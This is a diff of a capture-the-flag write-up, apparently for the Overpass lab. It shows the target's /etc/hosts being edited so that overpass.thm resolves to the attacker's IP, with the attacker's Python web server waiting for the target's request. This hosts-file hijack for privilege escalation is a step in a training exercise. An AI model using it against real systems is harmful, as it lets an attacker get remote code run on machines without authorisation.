@@ -725,18 +725,31 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 On the target, edit the `/etc/hosts` file by replacing the IP for the domain `overpass.thm` to the attacker IP address.
 
 ```shell
-james@ip-10-65-152-254:~$ vi /etc/hosts
-james@ip-10-65-152-254:~$ cat /etc/hosts
+james@ip-10-66-180-249:~$ cat /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
-10.65.152.254 overpass.thm
+127.0.0.1 overpass.thm
 # The following lines are desirable for IPv6 capable hosts
 ::1     ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
+james@ip-10-66-180-249:~$ vi /etc/hosts
+james@ip-10-66-180-249:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+192.168.157.156 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+james@ip-10-66-180-249:~$ 
 ```
+
+Check the **python server** on the attacker machine for the request from the target.
 
 
 
